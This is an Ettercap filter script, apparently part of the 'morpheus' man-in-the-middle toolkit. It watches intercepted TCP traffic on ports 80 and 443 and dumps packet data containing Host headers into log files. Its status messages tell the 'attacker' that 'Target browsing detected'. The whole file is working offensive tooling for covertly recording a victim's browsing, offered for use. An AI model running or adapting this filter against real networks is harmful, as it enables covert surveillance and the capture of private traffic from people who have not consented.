############################################################################
#                                                                          #
#  HTTPS Request/Response Filter                                           #
#  based on code from ALoR & NaGA                                          #
#                                                                          #
#  This program is free software; you can redistribute it and/or modify    #
#  it under the terms of the GNU General Public License as published by    #
#  the Free Software Foundation; either version 2 of the License, or       #
#  (at your option) any later version.                                     #
#                                                                          #
############################################################################


##
#  This filter will store target packet header to figure it out
#  Is hostname (list of webdomains visited And dump tcp data)
##



#
# Report port 80 (tcp-http) traffic
# And warn attacker that Host value has been captured...
#
if (ip.proto == TCP && tcp.dst == 80 || tcp.src == 80) {
  msg("[morpheus] host:TaRgEt   [ ⊶  ]  port:80   [tcp] http ☆");
    if (search(DATA.data, "Host")) {
      msg("\n[morpheus] host:TaRgEt   [ ⊶  ]   found...");
      msg("[morpheus] | status: Target browsing detected");
      msg("[morpheus] |  info : tcp header found, log stored ✔");
      msg("[morpheus] |_ log  : morpheus/logs/grab_hosts.log\n");
      log(DECODED.data, "./grab_hosts.log");
  }
}


#
# Report port 443 (tcp-https) traffic
# And warn attacker that Host value has been captured...
#
if (ip.proto == TCP && tcp.dst == 443 || tcp.src == 443) {
  msg("[morpheus] host:TaRgEt   [ ⊶  ]  port:443  [tcp] https ☆");
    if (search(DATA.data, "Host")) {
      msg("\n[morpheus] host:TaRgEt   [ ⊶  ]   found...");
      msg("[morpheus] | status: Target browsing detected");
      msg("[morpheus] |  info : tcp header found, log stored ✔");
      msg("[morpheus] |_ log  : morpheus/logs/grab_ssl_hosts.log\n");
      log(DECODED.data, "./grab_ssl_hosts.log");
  }
}



